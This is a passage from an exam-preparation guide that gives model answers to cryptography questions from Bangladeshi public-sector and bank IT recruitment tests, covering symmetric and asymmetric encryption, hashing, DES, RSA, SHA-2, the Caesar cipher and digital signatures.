   Operational example — how each is used at a bank
   - **Encryption**: a customer's account number stored in the database is encrypted. When the application needs it, it decrypts it with the key and displays it. The original value must be recoverable.
   - **Hashing**: the customer's login password is hashed with a salt. When they log in, the entered password is hashed the same way and the digests are compared. The bank never stores or recovers the actual password — even a full database theft does not reveal it.

   - The design rule that follows: if you need the original value back, encrypt. If you only ever need to CHECK a value, hash.

9. **Breifly Explain Asymmetric encryption.** *[WZPGCL Assistant Engineer (CSE) 27.05.2023 compact it 501 (ET: N/A)]*

Answer: Asymmetric encryption, also called public key cryptography, uses a MATHEMATICALLY LINKED PAIR of keys — a public key that anyone may hold, and a private key kept secret by the owner.

   The rule
   - Whatever one key encrypts, only the OTHER key can decrypt.
   - Encrypt with the receiver's public key → only the receiver's private key can open it. This gives confidentiality.
   - Encrypt (sign) with the sender's private key → anyone can verify it with the sender's public key. This gives authentication.

   ```mermaid
   flowchart LR
       P[Plaintext] -->|encrypt with<br/>receiver's PUBLIC key| C[Ciphertext]
       C -->|decrypt with<br/>receiver's PRIVATE key| P2[Plaintext]
   ```

   Advantages
   - Solves the key distribution problem — no secret needs to be shared in advance.
   - Enables digital signatures and non-repudiation.
   - Scales well: `n` users need only `n` key pairs, whereas symmetric encryption needs `n(n−1)/2` shared keys.

   Disadvantages
   - Far slower than symmetric encryption — roughly 100 to 1000 times slower.
   - Requires a PKI with a trusted Certificate Authority to bind keys to identities.
   - Larger key sizes: RSA needs 2048 bits for the security AES gets from 128.

   Algorithms and uses
   - **RSA** (based on the difficulty of factoring large primes), **ECC** (elliptic curves, same security with much smaller keys), **Diffie-Hellman** (key exchange only), **DSA/ECDSA** (signatures only).
   - Used in HTTPS/TLS, SSH, PGP email, digital certificates, code signing and blockchain.
   - In practice it is combined with symmetric encryption: RSA or ECDH exchanges an AES session key, then AES encrypts the actual data. This gets the security of asymmetric with the speed of symmetric.

10. **Distinguish between Symmetric Encryption and Asymmetric Encryption. Give some examples of encryption algorithm. What are the different types of ciphers in cryptography? What are the factors to be considered for cryptographic strength?** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 533 (ET: MIST)]*

Answer:

    (a) Symmetric vs Asymmetric

    | Point | Symmetric | Asymmetric |
    |---|---|---|
    | Keys | ONE shared secret key | A PAIR — public and private |
    | Encrypt / decrypt | Same key for both | Public encrypts, private decrypts |
    | Speed | Very fast | 100-1000 times slower |
    | Key distribution | Difficult — the secret must be shared safely | Easy — the public key is published |
    | Number of keys for n users | `n(n−1)/2` | `2n` |
    | Key length for equivalent security | 128-256 bits | 2048-4096 bits (RSA) |
    | Digital signature support | No | Yes |
    | Best for | Bulk data encryption | Key exchange, signatures, small data |
    | Examples | AES, DES, 3DES, Blowfish, RC4 | RSA, ECC, Diffie-Hellman, DSA, ElGamal |

    (b) Example algorithms
    - **Symmetric**: AES (128/192/256-bit, the current standard), DES (56-bit, broken), 3DES (deprecated), Blowfish, Twofish, ChaCha20.
    - **Asymmetric**: RSA, ECC, Diffie-Hellman, DSA, ElGamal.
    - **Hash (no key)**: SHA-256, SHA-512, MD5, bcrypt, Argon2.

    (c) Types of cipher

    **By technique**
    - **Substitution cipher** — each element is replaced by another. Caesar, Vigenère, monoalphabetic.
    - **Transposition cipher** — elements are rearranged, not replaced. Rail fence, columnar transposition.
    - **Product cipher** — combines both, which is what modern block ciphers do.

    **By unit of operation**
    - **Block cipher** — encrypts fixed-size blocks (AES: 128-bit blocks). Modes: ECB, CBC, CTR, GCM.
    - **Stream cipher** — encrypts one bit or byte at a time (RC4, ChaCha20). Faster, used where data arrives continuously.

    **Classical vs modern**
    - Classical: Caesar, Playfair, Hill, Vigenère — all broken by frequency analysis.
    - Modern: AES, RSA, ECC — based on computational hardness.

    (d) Factors affecting cryptographic strength
    - **Key length** — the most important single factor. Each extra bit doubles the brute-force effort. AES-128 requires 2¹²⁸ attempts.
    - **Algorithm strength** — a peer-reviewed, standardised algorithm. Never invent your own.
    - **Key randomness** — keys must come from a cryptographically secure random source, not a predictable one.
    - **Key management** — generation, storage, rotation and destruction. Most real breaches come from stolen keys, not broken maths.
    - **Mode of operation** — ECB mode leaks patterns and must be avoided; GCM provides both confidentiality and integrity.
    - **Initialization Vector (IV)** — must be random and never reused with the same key.
    - **Salting** for password hashes, and a slow hash function (bcrypt, Argon2) to resist brute force.
    - **Implementation quality** — side-channel attacks on timing and power can defeat perfect maths.
    - **Resistance to known attacks** — differential and linear cryptanalysis, birthday attacks.
    - **Future proofing** — quantum resistance, since Shor's algorithm threatens RSA and ECC.

11. **What is Symmetric and Asymmetric Encryption? Explain with example.** *[NPCBL Executive Trainee (Software) 26.05.2023 compact it 499 (ET: IBA)]*

Answer:

    **Symmetric encryption**
    - Uses ONE shared secret key for both encryption and decryption. Both parties must already have the same key.
    - Fast and efficient, so it is used for bulk data.
    - Examples: AES, DES, 3DES, Blowfish.

    Example
    - Alice and Bob agree on the secret key `K = 7` in advance.
    - Alice encrypts `HELLO` by shifting each letter 7 places → `OLSSV`, and sends it.
    - Bob decrypts by shifting back 7 → `HELLO`.
    - Problem: how did they agree on `K = 7` safely in the first place? This is the key distribution problem.

    **Asymmetric encryption**
    - Uses a PAIR of mathematically linked keys — a public key that is published, and a private key kept secret.
    - What one key encrypts, only the other can decrypt.
    - Slow, so it is used for small data and key exchange.
    - Examples: RSA, ECC, Diffie-Hellman.

    Example
    - Bob publishes his public key openly. He keeps his private key secret.
    - Alice encrypts her message with **Bob's public key** and sends it.
    - Only **Bob's private key** can decrypt it — not even Alice can decrypt it once sent.
    - No secret had to be shared beforehand, which solves the key distribution problem.

    How they work together in practice — HTTPS
    - The browser and server use **asymmetric** encryption (RSA or ECDH) to agree on a random **session key**.
    - Then all page data is encrypted with **symmetric** AES using that session key.
    - This gives the key-distribution advantage of asymmetric encryption with the speed of symmetric encryption.

12. **What is symmetric and Asymmetric key explain with example?** *[Mongla Port Authority Assistant Programmer 2023 compact it 573 (ET: N/A)]*

Answer:

    **Symmetric key**
    - A single secret key shared by both parties, used for both encryption and decryption.
    - Analogy: a door lock where both people have identical copies of the same key.
    - Example: a ZIP file protected with the password `bank123`. Anyone with that same password can open it. AES and DES work this way.

    **Asymmetric key**
    - A pair of keys — a **public key** distributed openly, and a **private key** kept secret by the owner.
    - Analogy: a letterbox. Anyone can drop a letter in through the public slot, but only the owner's key opens it to take letters out.
    - Example: Bob publishes his public key on his website. Anyone can encrypt a message to him with it, but only Bob's private key can decrypt it. RSA and ECC work this way.

    | Point | Symmetric key | Asymmetric key |
    |---|---|---|
    | Number of keys | One, shared | Two, a linked pair |
    | Speed | Fast | Slow |
    | Key sharing | Must be shared secretly | Public key is shared openly |
    | Keys for 100 users | 4,950 | 200 |
    | Digital signatures | Not possible | Possible |
    | Algorithms | AES, DES, 3DES, Blowfish | RSA, ECC, Diffie-Hellman |

13. **What is Cryptography? Difference between Symmetric and Asymmetric encryption with example. Draw and design public key encryption using Hash function. Draw a diagram for e-commerce online transactions.** *[Combined Bank Senior Officer (IT) 13.10.2023 compact it 512 (ET: MIST)]*

Answer:

    (a) Cryptography
    - The science of securing information by transforming it so that only the intended recipient can understand it. It provides confidentiality, integrity, authentication and non-repudiation.

    (b) Symmetric vs asymmetric

    | Point | Symmetric | Asymmetric |
    |---|---|---|
    | Key | One shared secret | Public + private pair |
    | Speed | Fast | Slow |
    | Key distribution | Hard | Easy |
    | Use | Bulk data | Key exchange, signatures |
    | Examples | AES, DES, 3DES | RSA, ECC, Diffie-Hellman |

    - Example: a ZIP password protects a file symmetrically; HTTPS uses RSA asymmetrically to agree an AES session key.

    (c) Public key encryption combined with a hash function — the digital signature

    ```mermaid
    flowchart TD
        M[Message] --> H[Hash function<br/>SHA-256]
        H --> D[Message digest]
        D --> E[Encrypt with<br/>SENDER'S PRIVATE key]
        E --> S[Digital Signature]
        M --> T[Send message + signature]
        S --> T
        T --> R1[Receiver hashes the message<br/>to get digest 1]
        T --> R2[Receiver decrypts signature with<br/>SENDER'S PUBLIC key to get digest 2]
        R1 --> C{digest 1 = digest 2?}
        R2 --> C
        C -->|Yes| V[Valid — authentic and unaltered]
        C -->|No| X[Invalid — tampered or forged]
    ```

    - Hashing gives integrity, and encrypting the hash with the private key gives authentication and non-repudiation. Together they form the digital signature.

    (d) E-commerce online transaction flow

    ```mermaid
    flowchart LR
        C[Customer] -->|1. order + card details over HTTPS| M[Merchant site]
        M -->|2. payment request| G[Payment Gateway]
        G -->|3. forward| A[Acquiring Bank]
        A -->|4. via VISA/Mastercard/NPSB| I[Issuing Bank]
        I -->|5. verify balance, OTP, authorise| A
        A -->|6. response| G
        G -->|7. approved / declined| M
        M -->|8. order confirmation| C
        A -.->|9. settlement later, in batch| M
    ```

    - Steps 1-8 are **authorisation** and complete in seconds. Step 9, **settlement**, is the actual movement of funds and happens later in a batch.
    - Security at each stage: TLS encrypts the channel, the card number is tokenised so the merchant never stores it, an OTP or 3-D Secure provides second-factor authentication, and the whole chain must be PCI DSS compliant.

14. **The high level method of DES...** *[BPDB Assistant Engineer (CSE) 24.02.2023 compact it 450 (ET: BUET)]*

Answer: **DES (Data Encryption Standard)** is a symmetric block cipher adopted in 1977. It encrypts 64-bit blocks with a 56-bit effective key (64 bits including 8 parity bits) through 16 rounds of a Feistel network.

    High-level method
    ```mermaid
    flowchart TD
        A[64-bit plaintext block] --> B[Initial Permutation IP]
        B --> C[Split into L0 and R0<br/>32 bits each]
        C --> D[16 Feistel rounds<br/>with subkeys K1..K16]
        D --> E[32-bit swap]
        E --> F[Inverse Initial Permutation IP-1]
        F --> G[64-bit ciphertext block]
    ```

    - **Step 1 — Initial Permutation (IP).** The 64 input bits are rearranged in a fixed pattern.
    - **Step 2 — Split.** The block is divided into a left half `L0` and right half `R0`, 32 bits each.
    - **Step 3 — 16 rounds.** In each round `i`:
      - `Lᵢ = Rᵢ₋₁`
      - `Rᵢ = Lᵢ₋₁ ⊕ F(Rᵢ₋₁, Kᵢ)`
      - The function `F` expands the 32-bit half to 48 bits, XORs it with the 48-bit round subkey, passes it through eight **S-boxes** (which provide the non-linearity and are the heart of DES security), and then applies a P-box permutation.
    - **Step 4 — Key schedule.** The 56-bit key produces 16 different 48-bit subkeys through permuted choice and left circular shifts.
    - **Step 5 — Final swap and inverse permutation** produce the ciphertext.

    Properties
    - Decryption uses the SAME algorithm with the subkeys applied in reverse order — a property of Feistel structures that halves the hardware needed.
    - It achieves **confusion** (through S-boxes) and **diffusion** (through permutation and the Feistel structure).

    Why DES is obsolete
    - A 56-bit key gives only `2⁵⁶` possibilities, brute-forced in under a day since 1998.
    - **3DES** applied DES three times for a 112-bit effective key, but is slow and now also deprecated.
    - **AES** replaced it in 2001, with 128-bit blocks and 128/192/256-bit keys.

15. **Difference between symmetric and asymetric key encryption.** *[BEPZA Programmer 03.11.2023 compact it 562 (ET: N/A)]*

Answer:

    | Point | Symmetric key encryption | Asymmetric key encryption |
    |---|---|---|
    | Number of keys | One shared secret key | Two — a public and a private key |
    | Key for encryption | The shared key | Receiver's public key |
    | Key for decryption | The same shared key | Receiver's private key |
    | Speed | Very fast | Much slower |
    | Key distribution | The hard problem — the key must reach the other party securely | Solved — the public key is published openly |
    | Keys needed for n users | `n(n−1)/2` | `2n` |
    | Typical key size | 128-256 bits | 2048-4096 bits (RSA) |
    | Digital signature | Not supported | Supported |
    | Suitable for | Encrypting large volumes of data | Key exchange, signatures, small messages |
    | Algorithms | AES, DES, 3DES, Blowfish, RC4 | RSA, ECC, Diffie-Hellman, DSA |

    - Practical reality: neither is used alone. Real systems such as TLS, PGP and SSH use **hybrid encryption** — asymmetric to establish a shared session key, then symmetric to encrypt the traffic.

16. **Identify the type of algorithm? (i) MD5 (ii) AES (iii) RSA (iv) Diffie-Hellman** *[BAPEX Assistant General Manager (ICT) 20.01.2023 compact it 461 (ET: BUET)]*

Answer:

    | Algorithm | Type | Details |
    |---|---|---|
    | **(i) MD5** | **Hash function** (not encryption) | Message Digest 5, produces a 128-bit digest. One-way, no key. Broken since 2004 — collisions can be produced |
    | **(ii) AES** | **Symmetric block cipher** | Advanced Encryption Standard. 128-bit blocks, keys of 128/192/256 bits. The current global standard |
    | **(iii) RSA** | **Asymmetric encryption + digital signature** | Named after Rivest, Shamir, Adleman. Security rests on the difficulty of factoring large primes |
    | **(iv) Diffie-Hellman** | **Asymmetric KEY EXCHANGE protocol** | Lets two parties agree a shared secret over an insecure channel. It does NOT encrypt data itself |

    Important distinctions to state
    - MD5 is often wrongly called "encryption". It is hashing — irreversible, keyless.
    - Diffie-Hellman is not an encryption algorithm. It only establishes a shared key, which is then used with a symmetric cipher such as AES.
    - RSA can both encrypt and sign; Diffie-Hellman can do neither, only key agreement.

17. **Describe RSA Algorithm and how it works?** *[Teletalk Assistant Manager (IT) 2023 compact it 467 (ET: N/A)]*

Answer: RSA is an asymmetric encryption algorithm developed by Rivest, Shamir and Adleman in 1977. Its security rests on the fact that multiplying two large primes is easy, but factoring the product back into those primes is computationally infeasible.

    Key generation
    - **Step 1** — choose two large distinct prime numbers `p` and `q`.
    - **Step 2** — compute `n = p × q`. This `n` is the modulus and is part of both keys.
    - **Step 3** — compute Euler's totient `φ(n) = (p−1)(q−1)`.
    - **Step 4** — choose `e` such that `1 < e < φ(n)` and `gcd(e, φ(n)) = 1`. Commonly `e = 65537`.
    - **Step 5** — compute `d` such that `(d × e) mod φ(n) = 1`, that is `d` is the modular inverse of `e`.
    - **Public key = (e, n)**, **Private key = (d, n)**.

    Encryption and decryption
    - Encrypt: `C = Mᵉ mod n`
    - Decrypt: `M = Cᵈ mod n`

    Worked example with small numbers
    - Let `p = 3`, `q = 11` → `n = 33`, `φ(n) = 2 × 10 = 20`
    - Choose `e = 7` (since `gcd(7, 20) = 1`)
    - Find `d` such that `7d mod 20 = 1` → `d = 3` (because `21 mod 20 = 1`)
    - Public key `(7, 33)`, private key `(3, 33)`
    - Encrypt message `M = 5`: `C = 5⁷ mod 33 = 78125 mod 33 = 14`
    - Decrypt: `M = 14³ mod 33 = 2744 mod 33 = 5` ✓

    Uses
    - Encrypting small data, exchanging symmetric session keys in TLS, digital signatures, and SSL certificates.

    Limitations
    - Very slow compared with AES, so it is never used for bulk data.
    - Needs large keys (2048 bits minimum, 4096 preferred).
    - Threatened by quantum computing — Shor's algorithm can factor large numbers efficiently, which is driving the move to post-quantum cryptography.

18. **অথবা, (ক) Private key এবং Public key উদাহরণসহ ব্যাখ্যা করুন।** *[17th NTRCA Lecturer (ICT) (CSE): 2023 compact it 614 (ET: N/A)]*

Answer: In asymmetric cryptography every user has a mathematically linked PAIR of keys.

    **Public key**
    - Distributed openly to anyone. It can be published on a website or in a directory.
    - Used to ENCRYPT a message being sent to the owner, and to VERIFY a signature made by the owner.

    **Private key**
    - Kept absolutely secret by the owner and never shared.
    - Used to DECRYPT messages sent to the owner, and to CREATE a digital signature.

    | Operation | Key used |
    |---|---|
    | Encrypt a message to Bob | Bob's PUBLIC key |
    | Decrypt that message | Bob's PRIVATE key |
    | Sign a document | Sender's PRIVATE key |
    | Verify that signature | Sender's PUBLIC key |

    Example — sending a confidential message
    - Karim wants to send a secret message to Rahim.
    - Rahim's public key is published on the company website, so Karim downloads it.
    - Karim encrypts the message with **Rahim's public key** and sends it.
    - Only **Rahim's private key** can decrypt it. Even Karim cannot decrypt it after sending.

    Example — signing a document
    - Rahim signs a contract with **his own private key**.
    - Anyone can verify it with **Rahim's public key**, which proves the document came from Rahim and has not been altered.
    - Rahim cannot later deny signing it, because only he holds that private key — this is non-repudiation.

    - Analogy: a letterbox. The public key is the open slot — anyone can post a letter in. The private key is the key to the box — only the owner can take letters out.

19. **(খ) Plaintext ও Cipher text এর পার্থক্য লিখুন।** *[17th NTRCA Lecturer (ICT) (CSE): 2023 compact it 614 (ET: N/A)]*

Answer:

    | Point | Plaintext | Ciphertext |
    |---|---|---|
    | Meaning | The original readable message | The encrypted, unreadable form |
    | Readability | Human readable and understandable | Meaningless without the key |
    | Stage | Input to encryption, output of decryption | Output of encryption, input to decryption |
    | Security | Not secure — anyone who sees it understands it | Secure — useless without the key |
    | Transmission | Should never be sent over an insecure network | Safe to send over a public network |
    | Also called | Cleartext | Cryptogram, encrypted text |
    | Example | `HELLO` | `KHOOR` (Caesar shift 3) or `X8#kL2p@` (AES) |

    Relationship
    ```
    Plaintext  --[Encryption + Key]-->  Ciphertext
    Ciphertext --[Decryption + Key]-->  Plaintext
    ```

    - The whole purpose of cryptography is to keep data as ciphertext whenever it is exposed — travelling over a network or stored on a disk — and convert it to plaintext only inside the trusted endpoint that is authorised to read it.

20. **What is SHA-256 and SHA-512 in network security, what is avalanche effect, is it desirable or undesirable.** *[RPGCL Assistant Manager (ICT) 2022 compact it 655 (ET: BUET)]*

Answer:

    **SHA-256 and SHA-512**
    - Both belong to the **SHA-2 (Secure Hash Algorithm 2)** family, designed by the NSA and published by NIST in 2001.
    - **SHA-256** produces a **256-bit** (32-byte) digest, written as 64 hexadecimal characters. It processes 512-bit blocks in 64 rounds using 32-bit words.
    - **SHA-512** produces a **512-bit** (64-byte) digest, 128 hexadecimal characters. It processes 1024-bit blocks in 80 rounds using 64-bit words.
    - SHA-512 is actually FASTER than SHA-256 on 64-bit processors, because it works with 64-bit words natively.

    Uses in network security
    - Password storage (combined with a salt), digital signatures and certificates, TLS handshake integrity, file and software integrity verification, HMAC message authentication, blockchain block hashing (Bitcoin uses SHA-256), and forensic evidence integrity.

    **Avalanche effect**
    - The property that a SMALL change in the input produces a COMPLETELY DIFFERENT output — statistically, changing one input bit should flip about half the output bits.

    Example
    ```
    SHA-256("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
    SHA-256("hellp") = a4b7d... (entirely different, though only one letter changed)
    ```

    **Is it desirable?** — **Highly DESIRABLE.** It is an essential property of any secure hash function.

    Why it is desirable
    - **Prevents inference** — an attacker cannot learn anything about the input by observing how the output changes.
    - **Makes tampering detectable** — altering a single character of a document changes the hash completely, so the change cannot be hidden.
    - **Defeats partial matching** — an attacker cannot get "closer" to the right answer by guessing, because near-misses produce entirely unrelated outputs.
    - **Supports collision resistance** — it is what makes finding two inputs with the same hash infeasible.

    - Without the avalanche effect, similar passwords would produce similar hashes, and an attacker could work towards the correct value incrementally. A hash function lacking it would be worthless for security.

21. **(ii) Symmetric Key Encryption and Asymmetric Key Encryption ব্যাখ্যা করুন।** *[BPSC Assistant Programmer (Ministry of Commerce) 2021 compact it 790 (ET: N/A)]*

Answer:

    **Symmetric key encryption**
    - A single secret key performs both encryption and decryption. Both sender and receiver must possess the same key.
    - Working: `Ciphertext = E(Plaintext, K)` and `Plaintext = D(Ciphertext, K)`, with the same `K` in both.
    - Advantages: very fast, low computational cost, ideal for large volumes of data.
    - Disadvantages: the key must be shared securely beforehand, and `n(n−1)/2` keys are needed for `n` users.
    - Algorithms: AES (current standard), DES, 3DES, Blowfish, RC4.

    **Asymmetric key encryption**
    - A mathematically linked pair of keys: a public key that is published, and a private key kept secret.
    - Working: `Ciphertext = E(Plaintext, Public key)` and `Plaintext = D(Ciphertext, Private key)`.
    - Advantages: no secret needs to be shared in advance, supports digital signatures and non-repudiation, needs only `2n` keys for `n` users.
    - Disadvantages: 100-1000 times slower, requires much larger keys, and needs a PKI with a trusted Certificate Authority.
    - Algorithms: RSA, ECC, Diffie-Hellman, DSA.

    How they are combined in practice — hybrid encryption
    - Asymmetric encryption exchanges a random symmetric session key.
    - Symmetric encryption then protects the actual data with that key.
    - This is exactly how HTTPS, SSH and PGP work, taking the key-distribution benefit of one and the speed of the other.

22. **(a) What is meant by Encryption and Decryption?** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 796 (ET: N/A)]*

Answer:
    - **Encryption** is the process of converting readable data (plaintext) into an unreadable form (ciphertext) using a cryptographic algorithm and a key, so that unauthorised people cannot understand it.
    - **Decryption** is the reverse process — converting ciphertext back into the original plaintext using the correct key.

    ```
    Plaintext  --[Encryption algorithm + Key]-->  Ciphertext
    Ciphertext --[Decryption algorithm + Key]-->  Plaintext
    ```

    Example
    - Plaintext `HELLO`, encrypted with a Caesar shift of 3, becomes `KHOOR`.
    - `KHOOR` decrypted with the same shift of 3 returns `HELLO`.

    Purpose
    - **Confidentiality** — data intercepted in transit or stolen from storage is unreadable.
    - Encryption protects data **in transit** (HTTPS, VPN) and **at rest** (disk and database encryption).
    - Two types: symmetric (one shared key — AES, DES) and asymmetric (public and private key pair — RSA, ECC).

23. **Difference between private key and public key.** *[BCC CA Monitoring System Project 2021 compact it 829 (ET: N/A)]*

Answer:

    | Point | Private Key | Public Key |
    |---|---|---|
    | Distribution | Kept absolutely secret by the owner | Distributed openly to anyone |
    | Who holds it | Only the owner | Everyone |
    | Used to | Decrypt received messages, and CREATE digital signatures | Encrypt messages to the owner, and VERIFY the owner's signatures |
    | If exposed | Total compromise — security is lost | No harm — it is meant to be public |
    | Storage | In a secure keystore, HSM or smart card | In a certificate, directory or website |
    | Generated | As a mathematically linked pair, together | As a mathematically linked pair, together |
    | Also called | Secret key | — |

    Rules to remember
    - Encrypt with the RECEIVER'S PUBLIC key → decrypt with the RECEIVER'S PRIVATE key. (Confidentiality)
    - Sign with the SENDER'S PRIVATE key → verify with the SENDER'S PUBLIC key. (Authentication)

    - Note the direction reverses between encryption and signing, which is the point students most often confuse.
    - The pair is generated together and is mathematically linked, but deriving the private key from the public key is computationally infeasible — that is the entire basis of public-key cryptography.

24. **Write two symmetric key algorithm name.** *[JGTDSL Assistant Engineer (CSE) 08.10.2021 compact it 859 (ET: N/A)]*

Answer: Two symmetric key algorithms:

    - **AES (Advanced Encryption Standard)** — the current global standard, adopted by NIST in 2001. A block cipher with 128-bit blocks and key sizes of 128, 192 or 256 bits. Fast, secure and hardware-accelerated on modern CPUs.
    - **DES (Data Encryption Standard)** — the older standard from 1977. A 64-bit block cipher with a 56-bit effective key. Now considered broken, because the key space is small enough to brute-force.

    Other symmetric algorithms
    - **3DES (Triple DES)** — applies DES three times for a 112-bit effective key; deprecated.
    - **Blowfish** and **Twofish** — free alternatives designed by Bruce Schneier.
    - **RC4** — a stream cipher, now broken and removed from TLS.
    - **ChaCha20** — a modern stream cipher, used in TLS alongside AES.

25. **(b) Describe secret key and public key encryption.** *[BPSC (Security Services Division) Assistant Maintenance Engineer 15.12.2021 compact it 896 (ET: N/A)]*

Answer:

    **Secret key encryption (symmetric)**
    - One shared secret key is used for both encryption and decryption, so both parties must hold the same key.
    - Process: `C = E(P, K)` to encrypt, `P = D(C, K)` to decrypt, with the same `K`.
    - Strengths: very fast, low computational load, suitable for encrypting large files and network streams.
    - Weaknesses: the key must be delivered to the other party over a secure channel, which is the classic key distribution problem. Key count grows as `n(n−1)/2`.
    - Algorithms: AES, DES, 3DES, Blowfish.

    **Public key encryption (asymmetric)**
    - A mathematically linked key pair. The public key is published; the private key is kept secret.
    - Process: encrypt with the receiver's public key, decrypt with the receiver's private key.
    - Strengths: no prior secret sharing, supports digital signatures and non-repudiation, key count is only `2n`.
    - Weaknesses: much slower, requires larger keys, needs a PKI and trusted Certificate Authority.
    - Algorithms: RSA, ECC, Diffie-Hellman, DSA.

    Combined use
    ```mermaid
    flowchart LR
        A[Public key crypto<br/>exchanges the session key] --> B[Symmetric crypto<br/>encrypts the actual data]
    ```
    - This hybrid model is used by TLS, SSH, PGP and virtually every secure protocol, because it gets the security properties of public key cryptography at the speed of secret key cryptography.

26. **The Caesar Cipher is a type of shift cipher. Shift Ciphers work by using the modulo operator to encrypt and decrypt messages. The Shift Cipher has a key K, which is an integer from 0 to 25. How to Encrypt, How to decrypt.** *[Janata Bank Ltd SO ( Assistant Network Engineer) 2020 compact it 1009-1010 (ET: N/A)]*

Answer: The Caesar cipher replaces each letter by another letter a fixed number of positions along the alphabet, wrapping around at Z.

    Letter-to-number mapping
    - `A = 0, B = 1, C = 2, ... Z = 25`

    **Encryption formula**
    ```
    C = (P + K) mod 26
    ```
    - `P` is the numeric value of the plaintext letter, `K` is the key, `C` is the numeric value of the ciphertext letter.

    **Decryption formula**
    ```
    P = (C − K + 26) mod 26
    ```
    - Adding 26 before the modulo keeps the result non-negative in languages where `%` can return a negative value.

    Worked example — encrypt `HELLO` with `K = 3`

    | Letter | P | (P + 3) mod 26 | C | Cipher letter |
    |---|---|---|---|---|
    | H | 7 | 10 | 10 | K |
    | E | 4 | 7 | 7 | H |
    | L | 11 | 14 | 14 | O |
    | L | 11 | 14 | 14 | O |
    | O | 14 | 17 | 17 | R |

    - Ciphertext: **KHOOR**

    Decrypting `KHOOR` with `K = 3`

    | Letter | C | (C − 3 + 26) mod 26 | P | Plain letter |
    |---|---|---|---|---|
    | K | 10 | 7 | 7 | H |
    | H | 7 | 4 | 4 | E |
    | O | 14 | 11 | 11 | L |
    | O | 14 | 11 | 11 | L |
    | R | 17 | 14 | 14 | O |

    - Plaintext: **HELLO** ✓

    Wrap-around example
    - `Z` with `K = 3`: `(25 + 3) mod 26 = 28 mod 26 = 2` → `C`. The `mod 26` is what makes the alphabet circular.

    Weakness
    - Only 25 possible keys, so it is broken instantly by brute force. It is also trivially broken by frequency analysis, since the letter distribution of the plaintext is preserved. It has no practical security value today and is taught only to illustrate substitution.

27. **Public key cryptography কীভাবে কাজ করে?** *[BPSC Assistant Maintenance Engineer (CSE) 2020 compact it 1020 (ET: N/A)]*

Answer: Public key cryptography works by giving every user a mathematically linked PAIR of keys, where what one key does only the other can undo.

    Key generation
    - Large prime numbers or elliptic curve points are used to generate a public key and a private key together.
    - Deriving the private key from the public key is computationally infeasible — this asymmetry is the entire foundation.

    For confidentiality
    ```mermaid
    flowchart LR
        A[Sender] -->|1. gets receiver's PUBLIC key| K[Public key directory]
        A -->|2. encrypts message| C[Ciphertext]
        C -->|3. sent over insecure network| B[Receiver]
        B -->|4. decrypts with own PRIVATE key| P[Original message]
    ```
    - Anyone can encrypt to the receiver, but only the receiver can read it.

    For authentication — digital signature
    - The sender hashes the message and encrypts the digest with their PRIVATE key.
    - The receiver decrypts it with the sender's PUBLIC key and compares it with a freshly computed hash.
    - A match proves the sender's identity and that the message is unaltered.

    Why it is secure
    - It relies on mathematical problems that are easy in one direction and hard in reverse: factoring large primes (RSA), the discrete logarithm problem (Diffie-Hellman), or the elliptic curve discrete logarithm problem (ECC).

    Practical use
    - HTTPS/TLS, SSH, PGP email, digital certificates, code signing, blockchain wallets.
    - Because it is slow, it is used only to exchange a symmetric session key or to sign a small hash, never to encrypt bulk data directly.

28. **(গ) Plain Text and Cipher Text-এর মধ্যে মূল পার্থক্য কী? লিখুন।** *[16th NTRCA Lecturer (ICT) (CSE): 2019 compact it 1069 (ET: N/A)]*

Answer: The fundamental difference is READABILITY — plaintext can be understood by anyone, ciphertext cannot be understood without the key.

    | Point | Plaintext | Ciphertext |
    |---|---|---|
    | Definition | The original, unencrypted message | The encrypted, scrambled message |
    | Readable | Yes, by anyone | No, only after decryption |
    | Position in the process | Before encryption, after decryption | After encryption, before decryption |
    | Requires a key to understand | No | Yes |
    | Safe to transmit publicly | No | Yes |
    | Example | `Account balance is 50000` | `X8#kL2p@9mQ!vZ` |

    Relationship
    ```
    Plaintext --[Encryption]--> Ciphertext --[Decryption]--> Plaintext
    ```

    - The essential security principle: sensitive data should exist as plaintext ONLY inside the trusted endpoint that is authorised to process it. Everywhere else — on the network, on disk, in backups — it should exist as ciphertext.

29. **(ক) Data encryption বলতে কী বোঝায়? বহুল ব্যবহৃত কয়েকটি encryption পদ্ধতির নাম লিখুন।** *[16th NTRCA Lecturer (ICT) (ICT): 2019 compact it 1095 (ET: N/A)]*

Answer:

    (a) Data encryption
    - The process of converting readable data into an unreadable coded form using a mathematical algorithm and a key, so that only authorised parties holding the correct key can read it.
    - Its purpose is to protect confidentiality of data both **in transit** (moving over a network) and **at rest** (stored on disk or in a database).

    (b) Widely used encryption methods

    **Symmetric key algorithms**
    - **AES (Advanced Encryption Standard)** — the current global standard. 128-bit blocks with 128/192/256-bit keys.
    - **DES (Data Encryption Standard)** — the 1977 standard, now broken due to its 56-bit key.
    - **3DES (Triple DES)** — DES applied three times; deprecated.
    - **Blowfish** and **Twofish** — free, well-regarded alternatives.
    - **RC4** — a stream cipher, now removed from TLS as insecure.

    **Asymmetric key algorithms**
    - **RSA** — the most widely used public key algorithm, based on prime factorisation.
    - **ECC (Elliptic Curve Cryptography)** — the same security as RSA with much smaller keys, used on mobile devices.
    - **Diffie-Hellman** — key exchange only.
    - **DSA / ECDSA** — digital signatures only.

    **Hash functions (one-way, keyless)**
    - **SHA-256, SHA-512** — secure and standard.
    - **MD5, SHA-1** — broken, no longer acceptable for security.
    - **bcrypt, Argon2** — deliberately slow, designed for password storage.

    - Practical note: real systems use hybrid encryption — RSA or ECDH to exchange a key, then AES to protect the data.

30. **What is public key encryption? Explain digital signature with example.** *[ICT Ministry Assistant Programmer 2017 compact it 1238-1239 (ET: N/A)]*

Answer:

    (a) Public key encryption
    - An encryption scheme using a mathematically linked key pair: a PUBLIC key distributed openly and a PRIVATE key kept secret.
    - A message encrypted with the receiver's public key can be decrypted only by the receiver's private key, so no secret has to be shared in advance.
    - Algorithms: RSA, ECC, Diffie-Hellman, DSA.

    (b) Digital signature
    - An electronic mechanism that proves who created a message and that it has not been altered. It uses the key pair in the REVERSE direction from encryption — sign with the private key, verify with the public key.

    ```mermaid
    flowchart TD
        M[Original document] --> H1[Hash with SHA-256]
        H1 --> D1[Digest]
        D1 --> S[Encrypt digest with<br/>SENDER'S PRIVATE key]
        S --> SIG[Digital Signature]
        M --> SEND[Send document + signature]
        SIG --> SEND
        SEND --> V1[Receiver hashes the document → Digest A]
